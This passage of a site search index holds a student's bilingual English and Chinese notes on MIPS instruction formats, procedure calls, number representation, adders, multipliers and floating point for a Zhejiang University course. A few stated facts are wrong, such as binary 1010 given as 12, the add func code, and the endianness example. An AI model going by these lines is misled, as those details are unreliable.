name these registers.</p> <p>\u200b\u200b </p> <p>The s0 to s7, should be saved, and the t0 to t7 are usually temporaries.</p> <p>gp\u662f\u5168\u5c40\u6307\u9488\uff0c\u6307\u5411\u9759\u6001\u6570\u636estatic data</p> <p>Computer will use the registers for variables as much as possible, which is called register optimization.</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#instruction-set","title":"instruction set","text":"<p>the function of instruction can be mainly divided into</p> <ul> <li>calculate</li> <li>data transfer like lw sw</li> <li>logical calculate</li> <li>branch</li> <li>jump</li> </ul> <p>In MIPS, through the format of machine code, we can divide the instruction set into</p> <ul> <li>R type instruction: opcode + rs + rt + rd + shamt + func  (like rd = rs + rt</li> <li>I type instruction : opcode + rs + rt + immediate (rt = rs + imme</li> <li>J type instruction : opcode + address</li> </ul> <p>For example, <code>f=(g+h)-(i+j)</code>\u200bwe turned it to MIPS code <code>add t0,g,h add t1,i,j   sub f,t0,t1</code>\u200b</p> <p>In MIPS, we need to write the one instruction in one line only.    And if we want to write our annotation we use the \"#\".</p> <p>\u5faa\u73af\u8bed\u53e5\u8df3\u8f6c\u53c2\u770bPPT</p> <p>Here are several types of instruction in the MIPS</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#r-type-instruction","title":"R-type instruction","text":"<ol> <li>the first 6-bit is the operation code, they are all 000000 in R-type instruction</li> <li>the next 15-bit to express three register. The first two registers are operating register and the third one is target.</li> <li>the next 5-bit is used to express the shamt in sll, srl instruction</li> <li>the last 6-bit is the func code, which differ these R-type, for example the func code for add is 32 or 10000.</li> </ol> <p>The shift operation refer to PPT 57</p> <p>shift right is fill the begin with 0, it is used for unsigned nunber</p> <p>sll t1,s3,2   // s3\u4e58\u4ee54\u653e\u5230t1  \u4e00\u822c\u662f\u5728\u6570\u7ec4\u7684\u65f6\u5019\uff0c\u4e0b\u6807\u4e58\u4ee5\u5355\u4f4d\u5143\u7d20\u6240\u5360\u5b57\u8282</p> <p>and or not are all r-type</p> <p>nor t0,t1,zero \u5bf9t1\u6309\u4f4d\u53d6\u53cd</p> <p>JR\uff08\u6839\u636e\u5bc4\u5b58\u5668\u7684\u5730\u5740\u8fdb\u884c\u8df3\u8f6c\uff09\u662fr\u578b\u6307\u4ee4</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#i-type-instruction","title":"I-type instruction","text":"<p>\u7acb\u5373\u6570\u4e3a16\u4f4d\uff0c\u5728\u903b\u8f91\u8fd0\u7b97\u7684\u65f6\u5019\u5c06\u5176\u9ad8\u4f4d\u63090\u6269\u5c55\uff0c\u5728\u505a\u5176\u4ed6\u52a0\u6cd5\u4e4b\u7c7b\u7684\u8fd0\u7b97\u65f6\u505a\u7b26\u53f7\u62d3\u5c55</p> <p>immediate is from -2^15 to 2 ^ 15 -1</p> <p>including calculate with immediate, load and store and conditional branches.</p> <p>Most of instructions is I-type, the instruction excepts opcode is 000000,00001x, and 0100xx are used for I-type</p> <ol> <li>the first 6-bit is operation code</li> <li>the next 5-bit is register</li> <li>the next 5-bit is propose register</li> <li>the next 16-bit is constant or address</li> </ol> <p>conditional branches</p> <p>BEQ(\u76f8\u7b49\u8df3\u8f6c) BNE(\u4e0d\u76f8\u7b49\u8df3\u8f6c)</p> <p>beq rs,rt,l1 \u82e5rs\u7b49\u4e8ert\uff0c\u5219\u8fdb\u884c\u8df3\u8f6c PC=PC+4+(l1&lt;&lt;2)  //+4\u662f\u56e0\u4e3aPC\u5df2\u7ecf\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u6307\u4ee4\u672c\u8eab\u53604\u4e2a\u5b57\u8282\uff0cL1&lt;&lt;2\u4e5f\u662f\u8ba9\u5176\u6269\u5927\u56db\u4f4d \u4e5f\u5c31\u662f\u8bf4L1\u7684\u5185\u5bb9\u7b49\u4e8e\u8981\u8df3\u5230\u51e0\u6761\u6307\u4ee4\uff08\u4e00\u4e2a\u6307\u4ee4\u5360\u56db\u4f4d\uff09\u4f46\u662f\u76f8\u5bf9\u5bfb\u5740\u65f6\u6709\u8303\u56f4\u7684\uff0cL1\u662f\u4e00\u4e2alabel\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a\u52a9\u8bb0\u7b26\u5185\u90e8\u662f\u6709\u7b26\u53f7\u6570</p> <p>bne\u4e0ebeq\u540c\u7406\uff0c\u5c31\u53ea\u6709\u6761\u4ef6\u4e0d\u540c</p> <p>\u7ec4\u5408\u6307\u4ee4\uff08\u4f2a\u6307\u4ee4 pseudo instruction</p> <pre><code>slt sltu slti sltiu\n</code></pre> <p>SLT(\u6839\u636e\u6bd4\u8f83\u7684\u7ed3\u679c\uff0c\u8bbe\u5b9a\u76ee\u6807\u5bc4\u5b58\u5668\u7684\u503c)</p> <p>SLT rd,r1,r2 ====== if(r1&lt;r2) rd=1 else rd=0</p> <p>slti rd,rs,const======if(rs&lt;const) rd=1 else rd=0 \u7136\u540e\u7528bne beq\u5c06rd\u4e0ezero\u6bd4\u8f83 \u6765\u8fdb\u884c\u8df3\u8f6c.</p> <p>MIPS \u4e2d\u5b9e\u9645\u4e0a\u53ea\u7528bne beq \u4f46\u662f\u901a\u8fc7\u6307\u4ee4\u7684\u96c6\u5408\u53ef\u4ee5\u5b9e\u73b0blt\u7b49\u6bd4\u8f83\u8df3\u8f6c\u6307\u4ee4</p> <p>slti \u5bc4\u5b58\u5668\u6570\u548c\u7acb\u5373\u6570\u7684\u6bd4\u8f83</p> <p>sltui \u5bc4\u5b58\u5668\u6570\u548c\u7acb\u5373\u6570\u6bd4\u8f83 \u65e0\u7b26\u53f7\u7248\u672c</p> <p>\u6c47\u7f16\u4e2d\u53ef\u4ee5\u8f6c\u6362\u6210 Blt s1,s2,label \u4f2a\u6307\u4ee4 Slt t0,s1,s2 Bne t0,zero,label</p> <p>slt\u4e3ar\u6307\u4ee4\uff0cslti\u4e3ai\u6307\u4ee4</p> <p>\u5176\u4ed6\u7684\u4f2a\u6307\u4ee4</p> <p>move s2,s1  \u5b9e\u9645\u4e0a\u662f add s2,s1,zero</p> <p>Beqz s1,L1 \u5b9e\u9645\u4e0a\u662f Beq r1,zero,L1</p> <p>blt t0,t1,L \u5b9e\u9645\u4e0a\u662f slt at,t0,t1                 bne at,zero,L</p> <p>\u4f2a\u6307\u4ee4\u53ef\u80fd\u5728\u6211\u4eec\u6ce8\u610f\u4e0d\u5230\u7684\u65f6\u5019\u4f7f\u7528\u4e86\u5bc4\u5b58\u5668\uff0c\u800cCPU\u7ed9\u4f2a\u6307\u4ee4\u63d0\u4f9b\u4e86\u5bc4\u5b58\u5668$at \u6211\u4eec\u4e00\u822c\u5199\u7a0b\u5e8f\u65f6\u5019\u4e0d\u7528\u5b83\uff0c\u4e13\u95e8\u7ed9\u7f16\u8bd1\u5668\u4f7f\u7528</p> <p>32-bit constant</p> <p>\u5982\u4f55\u521b\u5efa\u4e00\u4e2a32\u4f4d\u7684\u6570</p> <pre><code>lui s0,61                //\u4e0a16\u4f4d\nori s0,s0,2304           //\u4e0b16\u4f4d\n</code></pre>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#j-type-instruction","title":"J-type instruction","text":"<p>6\u4f4d\u64cd\u4f5c\u7801\u52a026\u4f4d\u7acb\u5373\u6570</p> <p>\u5305\u62ec\u65e0\u6761\u4ef6\u8df3\u8f6c</p> <p>unconditional branch</p> <p>J L1</p> <p>JAL\uff08\u8c03\u7528\u5b50\u7a0b\u5e8f\uff09</p> <p>Jal L1 ($ra=PC+4(\u7528\u4e8e\u5b58\u50a8\u8fd4\u56de\u7684\u5730\u5740),go to L1)</p> <p>lui rt,constant   \u628a\u7acb\u5373\u6570\u653e\u5230rt\u7684\u9ad8\u4f4d\uff0c\u5176\u4ed6\u4f4d\u5168\u90e8\u4e3a0</p> <p>J Label\u5b9e\u9645\u7684\u64cd\u4f5c\u662f\u628aPC\u7684\u524d4\u4f4d\u62ff\u51fa\u6765\u548c26\u4f4d\u7acb\u5373\u6570\uff08\u6269\u5927\u56db\u500d\uff09\u62fc\u621032\u4f4d PC PC = ((PC+4) &amp; 0xF000_0000) | (label &lt;&lt; 2)</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#procedure-calling","title":"procedure calling","text":"<p>to make a procedure calling</p> <ol> <li>place the parameters in registers \u6709\u4e13\u95e8\u7684\u7684\u5bc4\u5b58\u5668\uff0c\u4f46\u6570\u91cf\u6709\u9650a0-a3</li> <li>transfer the control to procedure \"jal\"</li> <li>acquire storage for procedure \u5230\u4e86\u5b50\u7a0b\u5e8f\uff0c\u9700\u8981\u4e3a\u5176\u7533\u8bf7\u6808\u7a7a\u95f4</li> <li>perform operation in procefure</li> <li>place the result in register for caller \u4e5f\u6709\u4e13\u95e8\u4e24\u4e2a\u5bc4\u5b58\u5668v0 v1</li> <li>return the place of call (register $ra)</li> </ol> <p>JAL \u6307\u4ee4\uff0c\u7528\u7684\u662f\u7acb\u5373\u6570\uff0c\u9700\u8981\u572826\u4f4d\uff0c\u4f1a\u5148\u628a\u4e0b\u4e00\u6761\u6307\u4ee4\u653e\u5728ra\uff0c\u7528\u6765\u4f5c\u4e3a\u8fd4\u56de\u7684\u5730\u5740\uff0c\u5728\u5b50\u7a0b\u5e8f\u91cc\u53ef\u80fd\u4f1a\u91cd\u5199ra\uff0c\u56e0\u6b64\u9700\u8981\u628a\u5b83\u5b58\u8d77\u6765 \u751a\u81f3\u6709\u53ef\u80fd\u6211\u4eec\u5199\u7684\u8fd9\u4e2a\u7a0b\u5e8f\u672c\u8eab\u4e5f\u662f\u5b50\u7a0b\u5e8f\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u4f7f\u7528JAL\u4e4b\u524d\u9700\u8981\u5c06ra\u5b58\u8d77\u6765</p> <p>\u5728\u8bbe\u8ba1\u4e0a\uff0c\u5b50\u7a0b\u5e8f\u7684\u8c03\u7528\u8005\u548c\u88ab\u8c03\u7528\u8005\u672c\u8eab\u6709\u5404\u81ea\u7684\u4e49\u52a1</p> <p>caller  \u8c03\u7528\u8005</p> <p>\u8981\u4fdd\u5b58a0-a3\uff0c ra\uff0ct0-t9\uff08\u610f\u5473\u7740\u4f60\u5141\u8bb8\u8c03\u7528\u7684\u5b50\u7a0b\u5e8f\u4f7f\u7528a0-a3\uff0c\u4ee5\u53cat0-t9</p> <p>callee \u88ab\u8c03\u7528\u8005</p> <p>\u8981\u4fdd\u5b58s0-s7  local variables</p> <p>\u9012\u5f52\u7a0b\u5e8f\u5b9e\u4f8b P97 in PPT</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#memory-layout","title":"memory layout","text":"<p>\u200b\u200b</p> <p>stack               \u5b50\u7a0b\u5e8f\u4f1a\u5728\u6808\u91cc\u9762\u5360\u7a7a\u95f4\uff0c\u5e76\u4e14\u9700\u8981\u6211\u4eec\u624b\u52a8\u91ca\u653e\uff0c\u4e0a\u7aef\u7528fp\u4e0b\u7aef\u7528sp \u6765\u754c\u5b9a\u4e00\u4e2a\u7a0b\u5e8f\u7684\u6808\u7a7a\u95f4\uff0c\u56e0\u4e3asp\u5728\u53d8\u5316\uff0c\u7528fp\u5bfb\u5740\u65b9\u4fbf\u4e00\u70b9</p> <p>dynamic linking</p> <p>\u9759\u6001\u94fe\u63a5\u662f\u7f16\u8bd1\u65f6</p> <p>\u52a8\u6001\u94fe\u63a5\u662f\u6267\u884c\u65f6</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#memory-address","title":"memory address *","text":"<p>Each address identifies an 8-bit byte</p> <p>Address must be an multiple of 4</p> <p>Endian-ness</p> <p>MIPS is Big Endian</p> <p>For example, here  is a 4-bit memory from 100 to 104 to express an integer. In Big Endian, the larger in memory is the lower bit in the integer.</p> <p>|100|101|102|103|| |1|0|1|0|| | -----| -----| -----| -----| -----------------------------|</p> <p>so the integer is \"1010\", which is \"12\"</p> <p>memory operand</p> <p>For example</p> <pre><code>A[12] = h + A[8];\n///////////////////\nlw t0, 32(s3)\nadd t0,s2,t0\nsw t0, 48(s3)\n</code></pre> <p>J label</p> <p>we have 26-bit immediate and it will upper 2 bit</p> <p>target address = PC(31 to 28) + label + 00</p> <p>jr r1</p> <p>we have a register, and we use its content as the address</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#the-representation-of-number","title":"the representation of number","text":"<p>unsigned binary integer</p> <p>We use the 32-bit binary integer to express integer</p> <p>We usual use \"0x 23\" to express \"23\" in hexadecimal 16\u8fdb\u5236</p> <p>for float number in binary we can miss the 0s at the begin and the end(after the decimal point), And we should learn the conversion of numbers, in which decimal to binary is important.</p> <p>Finite decimal number can be infinite binary number. But we can't express the infinite number in computer.</p> <p>tips.</p> <p>\u5f53\u8f83\u5927\u7684\u5341\u8fdb\u5236\u6570\u8f6c\u4e3a\u4e8c\u8fdb\u5236\u65f6\uff0c\u6709\u5fc5\u8981\u8fdb\u884c\u62c6\u5206 \u6bd4\u59821230.25\u4e2d\u62c6\u51fa1024\u7b49\u6570\u5b57\uff0c\u65b9\u4fbf\u8ba1\u7b97</p> <p>complement number</p> <p>\u8865\u7801\u7684\u8ba1\u7b97\uff08p36 in PPT\uff09</p> <p>The key of complement number is modular.</p> <p>\u8ba1\u7b97\u673a\u4e2d\u7684\u8fd0\u7b97\u5668\u662f\u6a21\u8fd0\u7b97\u7cfb\u7edf\uff0c\u6700\u9ad8\u4f4d\u8fdb\u4f4d\u5c06\u88ab\u5ffd\u7565\uff1b</p> <p>\u539f\u7801\u548c\u8865\u7801</p> <p>\u539f\u7801\u662f\u6307\u7b2c\u4e00\u4f4d\u8868\u793a\u7b26\u53f7\uff0c\u540e\u9762\u51e0\u4f4d\u8868\u793a\u6570\u7684\u7edd\u5bf9\u503c\u3002\u8865\u7801\u5bf9\u539f\u7801\u8fdb\u884c\u7684\u6539\u53d8\uff0c\u66f4\u52a0\u5229\u4e8e\u8ba1\u7b97 \u8865\u7801\u53ef\u4ee5\u5b9e\u73b0\u52a0\u51cf\u7684\u7edf\u4e00\uff0c\u51cf\u6389\u4e00\u4e2a\u6570\uff0c\u7b49\u4e8e\u52a0\u4e0a\u8fd9\u4e2a\u6570\u7684\u8d1f\u6570\uff0c\u90fd\u7528\u8865\u7801\u5c31\u53ef\u4ee5\u76f4\u63a5\u8ba1\u7b97 -2^n-1^ to +2^n-1^-1  10000...000 to 011111....11111</p> <p>\u8ba1\u7b97\u673a\u4e0d\u7528\u8865\u7801\u8868\u793a\u5c0f\u6570\uff0c\u5c0f\u6570\u4f1a\u53bb\u91c7\u7528\u6d6e\u70b9</p> <p>\u4e0d\u662f\u6240\u6709\u7684\u6700\u9ad8\u4f4d\u8fdb\u4f4d\u90fd\u4ee3\u8868\u6ea2\u51fa\uff0c\u6bd4\u5982-1+\uff08-2\uff09\u4e5f\u4f1a\u8fdb\u4f4d\uff0c\u4f46\u4e0d\u4ee3\u8868\u6ea2\u51fa</p> <p>\u79fb\u7801</p> <p>\u7ed9\u6bcf\u4e2a\u6570\u503c\u52a0\u4e0a\u4e00\u4e2a\u504f\u7f6e\u5e38\u6570\uff0c\u79fb\u7801\u5728\u6d6e\u70b9\u6570\u4e2d\u7528\u5230\u4e86\uff0c\u6bcf\u4e2a\u6570\u52a0\u4e0a2^n-1^</p> <p>1.01x2^-1^</p> <p>\u4e8c\u8fdb\u5236\u7684\u79d1\u5b66\u8ba1\u6570\u6cd5</p> <p>\u8fb9\u754c\u68c0\u67e5\u7684\u5c0f\u6280\u5de7</p> <p>\u6570\u7ec4\u7684\u8d8a\u754c\uff0c\u9700\u89810&lt;=x&lt;size\uff0c\u4ec5\u9700\u8981\u4e00\u6761\u6307\u4ee4</p> <pre><code>Sltu t0,s1,s2               t0=0 if s1&gt;=s2or s1&lt;0\n</code></pre> <p>\u8fdb\u884c\u65e0\u7b26\u53f7\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u82e5s1\u662f\u5c0f\u4e8e0\u7684\uff0c\u90a3\u4e48\u5176\u5728\u65e0\u7b26\u53f7\u6570\u60c5\u51b5\u4e0b\u662f\u5f88\u5927\u7684\uff0c\u4f1a\u5927\u4e8esize</p> <p>large constant and instruction jump</p> <p>\u4e00\u5171\u6709\u4e94\u79cd\u5bfb\u5740\u65b9\u5f0f</p> <p>immediate instruction can only provide the 16-bit constant</p> <p>beq s0,s1, L1 -&gt; bne s0,s1,L2;    j L1</p> <p>lui instuction</p> <p>jump can use 26-bit constant and the upper 4-bit use the PC, and all jump instruction will *4 so it has the 32-bit</p> <p>jr</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#byte-halfword-operation","title":"byte / halfword operation","text":"<p>In MIPS, there are some instruction to operate the byte and halfword</p> <pre><code>lb  lh\nlbu lhu\nsb  sh\n</code></pre>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#load-a-program","title":"load a program","text":"<p>p121 in ppt</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_2","title":"\u8ba1\u7b97\u673a\u7684\u7b97\u672f\u8fd0\u7b97","text":"<p>\u539f\u7801\uff0c\u53cd\u7801\uff0c\u8865\u7801\uff0c\u79fb\u7801</p> <p>\u9664\u4e86\u53cd\u7801\u4ee5\u5916\u4e4b\u524d\u90fd\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u6765\uff0c\u7136\u540e\u53cd\u7801\u5c31\u662f\u6574\u6570\u4e0d\u53d8\uff0c\u8d1f\u6570\u9664\u4e86\u7b26\u53f7\u4f4d\u4ee5\u5916\u53d6\u53cd</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_3","title":"\u52a0\u6cd5\u5668","text":"<p>\u5168\u52a0\u5668</p> <ul> <li>\u8f93\u5165\u4e3a\u52a0\u6570\uff0c\u88ab\u52a0\u6570\uff0c\u4f4e\u4f4d\u8fdb\u4f4d(cin)</li> <li>\u8f93\u51fa\u4e3a\u548c(F)\uff0c\u8fdb\u4f4d(cout)</li> </ul> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5168\u52a0\u5668  \u751f\u6210\u7ed3\u679c\u7684\u8fc7\u7a0b\u662f\u4e24\u4e2a\u5f02\u6216\u64cd\u4f5c\uff0c\u5ef6\u8fdf\u4e3a6\u4e2a\u95e8\u5ef6\u8fdf             \u751f\u6210\u8fdb\u4f4d\u7684\u8fc7\u7a0b\u662f\u4e00\u6b21\u5e76\u884c\u7684\u4e0e\u95e8\u548c\u4e00\u4e2a\u6216\u95e8\uff0c\u5ef6\u8fdf\u4e3a2\u4e2a\u95e8\u5ef6\u8fdf</p> <p>\u4e32\u884c\u8fdb\u4f4d\u52a0\u6cd5\u5668</p> <ul> <li>\u5047\u8bbe\u5f02\u6216\u95e8\u662f3\u4e2a\u95e8\u5ef6\u8fdf</li> </ul> <p>\u6bcf\u4e00\u4e2a\u5168\u52a0\u5668\u9700\u8981\u7b49\u5f85\u4e0a\u4e00\u7ea7\u7684\u8fdb\u4f4d\uff0c\u56e0\u6b64\u5230\u7b2cn\u4f4d\u4f1a\u67092*n+1</p> <p>\u5148\u884c\u8fdb\u4f4d\u52a0\u6cd5\u5668*</p> <p>\u5148\u884c\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u628a\u7136\u4e00\u4e2a\u52a0\u6cd5\u5668\u63a5\u53d7\u6240\u6709\u4e0e\u4e4b\u6709\u5173\u7684\u6570\u636e\uff0c\u4e32\u884c\u56e0\u4e3a\u81ea\u5df1\u53ea\u63a5\u53d7\u4e24\u4e2a\u6570\u548c\u4e00\u4e2a\u8fdb\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u5f85\u8fdb\u4f4d\uff0c\u4f46\u662f\u5148\u884c\u540c\u65f6\u63a5\u53d7\u81ea\u8eab\u548c\u81ea\u8eab\u540e\u9762\u7684\u6240\u6709\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u9012\u63a8\u76f4\u63a5\u5728\u5185\u90e8\u7b97\u51fa\u7ed3\u679c</p> <p>\u4ea7\u751f\u6240\u6709\u548c\u6570\u7684\u65f6\u95f4\u4e3a1\uff08\u8fdb\u4f4d\u751f\u6210\u51fd\u6570\uff09+2\uff08\u8fdb\u4f4d\u4f20\u9012\u51fd\u6570\uff0c\u524d\u4e00\u4f4d\u5df2\u7ecf\u5e76\u884c\uff09+3\uff08\u5f02\u6216\u95e8\uff0c\u524d3\u4e2a\u5df2\u7ecf\u88ab\u5e76\u884c\uff09</p> <p>\u5c40\u90e8\u5148\u884c\u52a0\u6cd5\u5668</p> <p>\u7531\u591a\u4e2a\u5148\u884c\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7ec4\u5408\u6210\u7684\u591a\u4f4d\u52a0\u6cd5\u5668</p> <p>\u4f8b\u598232\u4f4d\u52a0\u6cd5\u5668\u75314\u4e2a8\u4f4d\u5148\u884c\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7ec4\u6210</p> <p>\u95e8\u5ef6\u8fdf\u4e3a3+2+2+5</p> <p>n\u4f4d\u5e26\u6807\u5fd7\u52a0\u6cd5\u5668</p> <ul> <li>OF \u6ea2\u51fa\u6807\u5fd7  SF \u7b26\u53f7\u6807\u5fd7  ZF 0\u6807\u5fd7\uff08\u5168\u4e3a0\uff09 CF \u501f\u4f4d\u6807\u5fd7\uff08cin xor cout\uff09</li> </ul> <p>\u51cf\u6cd5\u5668</p> <p>\u52a0\u4e00\u4e2a\u53d6\u53cd\u548c\u591a\u8def\u9009\u62e9\u5668\uff0c\u4f7f\u5f97B\u7684\u8865\u7801\u53d8\u6210-B\u7684\u8865\u7801</p> <p>\u6ea2\u51fa\u5904\u7406</p> <p>MIPS\u4e2d\u65e0\u7b26\u53f7\u6570\u4e00\u822c\u4e0d\u5224\u65ad\u6ea2\u51fa\uff0c\u6709\u7b26\u53f7\u6570\u4f1a\u8fdb\u884c\u5f02\u5e38\u5904\u7406 P15</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_4","title":"\u4e58\u6cd5\u5668","text":"<p>\u53ef\u4ee5\u7528\u52a0\u6cd5\u5668\u548c\u79fb\u4f4d\u6765\u5b9e\u73b0\u65e0\u7b26\u53f7\u4e58\u6cd5</p> <p>\u6700\u7b80\u5355\u7684\u4e58\u6cd5\u5668</p> <p>\u901a\u8fc764\u4f4d\u52a0\u6cd5\u5668\u548c\u5de6\u79fb\uff0c\u8fed\u4ee332\u6b21\uff0c\u548c\u7b80\u5355\u7684\u63a7\u5236\u5355\u5143\u5b8c\u6210\u4e58\u6cd5\u8ba1\u7b97</p> <p>\u7b80\u5355\u7684\u4f18\u5316</p> <p>\u5c06\u79fb\u4f4d\u548cadd\u8fdb\u884c\u5e76\u884c\uff0c\u4e58\u6570\u5bc4\u5b58\u5668\u53f3\u79fb\uff0c\u5224\u65adadd\u662f\u5426\u53d1\u751f P20</p> <p>\u5feb\u901f\u4e58\u6cd5\u5668-\u6d41\u6c34\u7ebf\u65b9\u5f0f</p> <p>\u76f4\u63a5\u4f7f\u7528\u7ec4\u5408\u7535\u8def\u8fdb\u884c\u62fc\u63a5\u52a0\u6cd5\u5668\uff0c\u5f62\u6210\u4e58\u6cd5\u5668\uff0c\u4e0d\u5728\u9700\u8981control unit</p> <p>MIPS\u6c47\u7f16\u7684\u4e58\u6cd5</p> <p>mips\u91cc\u9762\u6709\u4e24\u4e2a\u5bc4\u5b58\u5668\u6765\u5b58\u50a8\u4e58\u6cd5\u8fd0\u7b97\u7684\u7ed3\u679c\uff0cHI\u8868\u793a\u9ad8\u4f4d32-bit\uff0cLO\u8868\u793a\u4f4e\u4f4d32-bit</p> <pre><code>mult rs,rt ;   multu rs,rt;  //\u53ea\u8ba1\u7b97\uff0c\u5199\u5165HI\uff0cLO\nmfhi rd \u8bfbHI\u5230rd\nmflo rd \u8bfbLO\u5230rd\nmul rd,rs,rt \u8ba1\u7b97\uff0c\u5e76\u4e14\u628a\u4f4e32-bit\u653e\u5230rd\n</code></pre>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_5","title":"\u9664\u6cd5\u5668","text":"<p>P27</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_6","title":"\u6d6e\u70b9\u6570","text":"<p>+/- 1.xxxxx * 2^yyyy^</p> <p>float\u662f8\u4f4dexponent\uff0cdouble\u662f11\u4f4dexponent</p> <p>exponent \u6700\u5c0f0000 0001 \u8868\u793a1-127    = -126  \u5168\u4e3a0\u8868\u793a0         \u6700\u59271111 1110 \u8868\u793a254-127 = +127 \u5168\u4e3a1\u8868\u793a\u65e0\u7a77\u5927</p> <p>\u5728\u6d6e\u70b9\u6570\u4e2d \u5168\u4e3a0\u7684exponent\u548c\u5168\u4e3a1\u7684exponent\u4e3a\u4fdd\u7559\u6570</p> <p>\u6d6e\u70b9\u6570\u662f\u4e0d\u7cbe\u786e\u7684\uff0c\u672c\u8d28\u4e0a\u6765\u8bf4\u8fd8\u662f2^32\u79cd\u4e0d\u540c\u7ed3\u679c\uff0c\u4f46\u662f\u8986\u76d6\u4e86\u66f4\u5927\u7684\u8303\u56f4\uff0c\u4e5f\u5c31\u8bf4\u660e\u5176\u66f4\u52a0\u4e0d\u7cbe\u786e\u3002</p> <p>the converting between decimal and fp</p> <p>fraction</p> <p>\u6d6e\u70b9\u6570\u8fd0\u7b97\u7684\u987a\u5e8f\u5f71\u54cd\u6700\u540e\u7ed3\u679c\uff0c\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b</p> <p>int \u7684\u6709\u6548\u4f4d\u6570\u4e3a32\u4f4d float\u7684\u6709\u6548\u4f4d\u4e3a24\u4f4d</p> <pre><code>int x;\nx==(int)(float)x;\n</code></pre> <p>\u6d6e\u70b9\u6570\u7684\u52a0\u6cd5</p> <ul> <li>\u9996\u5148\u9700\u8981\u8f6c\u6362\u6210\u6d6e\u70b9\u6570\u8fdb\u884c\u8ba1\u7b97</li> <li>\u5c06exponent\u6269\u5927\u5230\u76f8\u540c</li> <li>\u52a0\u6cd5\u8ba1\u7b97</li> <li>\u8f6c\u6362\u62101.xxx\u7684\u5f62\u5f0f\uff0c\u8ba1\u7b97\u51fa\u65b0\u7684exponent</li> <li>round and renormalize if necessary</li> </ul> <p>fp addition hardware P48</p> <p>\u6d6e\u70b9\u6570\u7684\u4e58\u6cd5</p> <p>\u6307\u6570\u76f8\u52a0\uff0c\u518d\u52a0\u4e0a127\u62161023</p> <p>\u5177\u4f53\u6570\u636e\u76f8\u4e581.0011*1.1100</p> <p>\u89c4\u8303\u4e3a\u4e00\u70b9\u51e0\uff0c\u622a\u65ad\u6700\u540e\uff0c\u820d\u5165</p> <p>\u786e\u5b9a\u7b26\u53f7</p> <p>\u6709\u4e13\u95e8\u7684\u6d6e\u70b9\u6570\u5bc4\u5b58\u5668</p> <p>\u8981\u8868\u793adouble\u5c31\u4e24\u4e2a\u4e00\u8d77\u7528 \\(f0 /\\)f1</p> <p>\u6d6e\u70b9\u6570 \u7684 \u6307\u4ee4</p> <p>lwc1 swc1</p> <p>lwc1 f8, 32($sp)</p> <p>add.s,  sub.s,  mul.s,  div.s       add.s f0, f1, f6 add.d,  sub.d,  mul.d,  div.d       mul.d f4, f4, f6</p> <p>\u6d6e\u70b9\u6570\u7684\u6bd4\u8f83</p> <p>c.xx.s / c.xx.d</p> <p>xx can be \"eq, neq, lt, le, gt, ge\"</p> <p>\u4e0b\u4e00\u6761\u6307\u4ee4\u7528bc1t  / bc1f + label</p> <p>bc1t targetLable</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#_7","title":"\u4e58\u6cd5\u548c\u9664\u6cd5","text":"<p>\u6709\u7b26\u53f7\u9664\u6cd5\uff0c\u9664\u6570\u548c\u88ab\u9664\u6570\u7684\u7b26\u53f7\u76f8\u53cd\u65f6\uff0c\u5546\u4e3a\u8d1f\uff0c\u975e\u96f6\u4f59\u6570\u7684\u7b26\u53f7\u4e0e\u88ab\u9664\u6570\u76f8\u540c</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#chapter4-processor","title":"chapter4 processor","text":"<p>The CPU performance factor is consists of instruction count and CPI and cycle time</p> <ul> <li>instruction count is determined by ISA and compiler</li> <li>CPI and Cycle time are determined by CPU hardware</li> </ul> <p>register only updates on clock edge when write control input is 1</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u90e8\u5206\u6307\u4ee4 lw sw add sub and or slt beq j</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#execution","title":"execution","text":"<p>1.PC-&gt; instruction memory-&gt;fetch instruction</p> <p>2.register numbers-&gt; register file \u5bc4\u5b58\u5668\u5806 -&gt; read register</p> <p>3.depends on instruction class</p> <ol> <li>use ALU</li> <li>access memory</li> </ol> <p>4.PC change</p> <p>\u7ebf\u7684\u9009\u62e9-&gt;\u591a\u8def\u9009\u62e9\u5668 Mux   